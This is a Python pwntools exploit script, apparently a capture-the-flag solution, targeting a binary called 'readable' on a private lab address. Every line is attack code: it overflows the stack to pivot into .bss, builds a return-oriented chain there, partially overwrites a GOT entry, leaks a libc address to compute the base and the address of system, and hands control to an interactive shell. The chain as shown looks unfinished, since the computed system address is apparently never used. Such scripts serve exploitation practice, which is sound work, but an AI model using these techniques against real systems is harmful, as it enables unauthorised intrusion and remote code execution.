from pwn import *
#p = process('./readable')
p = remote('192.168.56.103', 8888)

bss = 0x600910
push_link_map = 0x4003d0
pop_rdi = 0x0000000000400593
pop_rsi_pop = 0x0000000000400591
read_plt = 0x4003E0

def swrite(addr, data):
	payload  = 'a'*16
	payload += p64( addr + 0x10 )		#change rbp
	payload += p64( 0x400505 )
	payload += data
	p.send( payload )
def bwrite(addr, data):
	payload  = 'a'*16
	payload += p64( addr + 0x10 )		#change rbp
	payload += p64( 0x400505 )
	payload += data.ljust( 16, '\x00' )
	payload += p64( 0x600f00 )		
	payload += p64( 0x400505 )
	p.send( payload )
def gobss( ):
	payload  = 'c'*16
	payload += p64( bss )
	payload += p64( 0x400520)
	p.send( payload )

pad  = ''
pad += p64(0x6008f8)
pad += p64(0x400505)	#read one byte
pad += p64(0x600960)
pad += p64(pop_rdi)
pad += p64(1)
pad += p64(pop_rsi_pop)
pad += p64(0x6008f0)	#got
pad += p64(0xaaaabbbb)
pad += p64( read_plt )
pad += p64( pop_rdi )
pad += p64( 0 )
pad += p64(pop_rsi_pop)
pad += p64(0x6008e0)	#got



bwrite( 0x6009f0, 'sh\x00')
bwrite(0x6008f8, p64(0x600920) + p64(0x400520))	#for leave ret
for i in xrange(0, len(pad), 16):
	bwrite( 0x600910 + i, pad[i : i + 16])
gobss()
raw_input('send?')
p.send('\xd0')
data = p.recv(1024)
libc_start_main = u64( data[:8] )
libc_base = libc_start_main - 0x0000000000020950
system = libc_base + 0x00000000000443d0
print 'system: ',hex(system)






p.interactive()
